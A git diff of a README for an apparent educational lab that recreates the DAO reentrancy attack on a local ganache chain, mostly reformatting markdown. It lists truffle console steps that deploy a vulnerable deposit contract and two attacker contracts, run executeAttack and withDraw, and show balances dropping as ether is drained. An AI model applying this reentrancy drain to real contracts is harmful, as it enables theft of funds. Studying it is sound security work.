@@ -37,19 +37,21 @@ Clone the resposity change directory to the respository.
 
 I used VisualCode with the solidity extension.
 In a terminal window type
+
 ```ganache-cli -d -i 66```
+
 The i is the code that identifies the network.
 -d means always generate the same accounts and deploy contracts to the same address's
 This is critical as nothing will work in the code unless this flag is used.
 In another terminal or in the terminal window in VS type
 
-`truffle console --network development`
+```truffle console --network development```
 
 This will bring up the truffle console
 the file truffle-config.js has all the setting for this netwrok and the compiler being used.
 Now type
 
-`migrate reset` 
+```migrate reset``` 
 
 this will compile and deploy four contracts to the ganache instance
 Migrations
@@ -75,12 +77,12 @@ b attack.sol:55 will set a breakpoint at line 55 of attack.sol
 B all will remove all breakpoints
 Then c will run until the breakpoint is hit
 v will show local variables
-:<|expression|> will show that <|expression|>
-+:<|expression|> will add a watch expression. -:<|expresssion|> will remove it
+\:<|expression|> will show that <|expression|>
+\+:<|expression|> will add a watch expression. -:<|expresssion|> will remove it
 ? will list all watchs and breakpoints
 ; will show low level opcodes and the stack, I am unsure how to switch it off once it starts
 h shows help
-q quits it.
+q quits debugger
 
 Now create an interaface for the contracts
 
@@ -92,68 +94,105 @@ B = await AttackB.deployed()
 
  Now send d some Ether
  
- ```await d.sendTransaction({from:accounts[0],value:web3.utils.toWei('15', 'ether')})
+ ```await d.sendTransaction({from:accounts[0],value:web3.utils.toWei('15', 'ether')})```
+ 
  The attack withdrew 258 ether each cycle
  
  Now send A 258 wei worth of Tokens
- `A.sendDeposit(258)`
+ 
+ ```A.sendDeposit(258)```
+ 
  Check Ether balance of d address
- `await web3.utils.fromWei(await web3.eth.getBalance(d.address))`
+ 
+ ```await web3.utils.fromWei(await web3.eth.getBalance(d.address))```
+ 
  Should give
  '15'
  Check Ether balance of A and B
- `await web3.utils.fromWei(await web3.eth.getBalance(A.address))`
+ 
+ ```await web3.utils.fromWei(await web3.eth.getBalance(A.address))```
+ 
  should give 0
- `await web3.utils.fromWei(await web3.eth.getBalance(B.address))`
+ 
+ ```await web3.utils.fromWei(await web3.eth.getBalance(B.address))```
+ 
  should give 0
+ 
  Now call executeAttack
- `A.executeAttack(true)`
+ 
+ ```A.executeAttack(true)```
+ 
  Now withdraw the 258 wei
- `A.withDraw(258)`
+ 
+ ```A.withDraw(258)```
+ 
  Check balance of d
- `await web3.utils.fromWei(await web3.eth.getBalance(d.address))`
+ 
+ ```await web3.utils.fromWei(await web3.eth.getBalance(d.address))```
+ 
  14.999999999999991486
  Now check balance of A
- `await web3.utils.fromWei(await web3.eth.getBalance(A.address))`
- 0.000000000000008514
- Notice it withdrew 8514/258 = 33
+ 
+ ```await web3.utils.fromWei(await web3.eth.getBalance(A.address))```
+ 
+ 0.000000000000008514 
+ Notice it withdrew 8514/258 = 33 
  So it withdraws Once because of the initial call, then 31+1 times because the variable mutex in AttackA is set to 31 runs from 0
  So 32+1 = 33
  Now lets check Token balance of the attackA account in the deposit contract
- `(await d.getDepositBalance(A.address)).toString()`
+ 
+ ```(await d.getDepositBalance(A.address)).toString()```
+ 
  0
  Its zero, you can read the comment in the deposit.sol code about SAFE MATH
  Now check the token balance in contract B
- `(await d.getDepositBalance(B.address)).toString()`
+ 
+ ```(await d.getDepositBalance(B.address)).toString()```
+ 
  258
  So if we try and withdraw from contract A again it will revert because the Balance on deposit contract is zero
- `A.withDraw(258)`
+ 
+ ```A.withDraw(258)```
+ 
  Generates a lot of stuff on the screen but in there is 
  reason: "Balance is zero"
  At this point the attack should halt, but wait we have a psoitive balance over at Contract B
  If we run 
- `B.executeAttack(true)`
+ 
+ ```B.executeAttack(true)```
+ 
  Then call
- `B.withDraw(258)`
+ 
+ ```B.withDraw(258)```
+ 
  If we check the Balances again
- `(await d.getDepositBalance(B.address)).toString()`
+ 
+ ```(await d.getDepositBalance(B.address)).toString()```
+ 
   0
   So the B contract now has balance of zero on deposit
   While, wait for it... contract A has a balance of 258
-  `(await d.getDepositBalance(A.address)).toString()`
+  
+  ```(await d.getDepositBalance(A.address)).toString()```
+  
   258
   Ether Balance on contract A is as expected unchanged
-  `await web3.utils.fromWei(await web3.eth.getBalance(A.address)`
+  
+  ```await web3.utils.fromWei(await web3.eth.getBalance(A.address)```
+  
   0.000000000000008514
   While B is
-  `await web3.utils.fromWei(await web3.eth.getBalance(B.address)`
+  
+  ```await web3.utils.fromWei(await web3.eth.getBalance(B.address)```
+  
   0.000000000000008514
   The deposit contract is now
-  `await web3.utils.fromWei(await web3.eth.getBalance(d.address)`
-    14.999999999999982972
-    It was  14.999999999999991486
- 14.999999999999991486 - 14.999999999999982972 = 8514
- Now we can run withdraw on contractA again and then on contractB until we run out of ether for Gas or the Deposit contract runs out of Ether
+  ```await web3.utils.fromWei(await web3.eth.getBalance(d.address)```
+  
+ 14.999999999999982972
+ It was  14.999999999999991486
+14.999999999999991486 - 14.999999999999982972 = 8514
+Now we can run withdraw on contractA again and then on contractB until we run out of ether for Gas or the Deposit contract runs out of Ether 
 The attacker did the ping-pong about 50x from my reading.
 
 So in short the splitDAO had a bug the update balance was in the wrong place, it updated after the Ether was sent instaed of updating and then 
@@ -163,12 +202,18 @@ Repeating the steps above of course this can automated, it will drain all the Et
 
 DAO.js contains a script that automates the above actions
 To run first start truffle console
-`migrate reset`
-`d = await Deposit.deployed()`
+
+```migrate reset```
+
+```d = await Deposit.deployed()```
+
 Send some Ether to the deposit contract
-`await d.sendTransaction({from:accounts[0],value:web3.utils.toWei('15', 'ether')})`
+
+```await d.sendTransaction({from:accounts[0],value:web3.utils.toWei('15', 'ether')})```
+
 Once deposit contract has some Ether in it
-`exec ./DAO.js`
+
+```exec ./DAO.js```
 
 
 
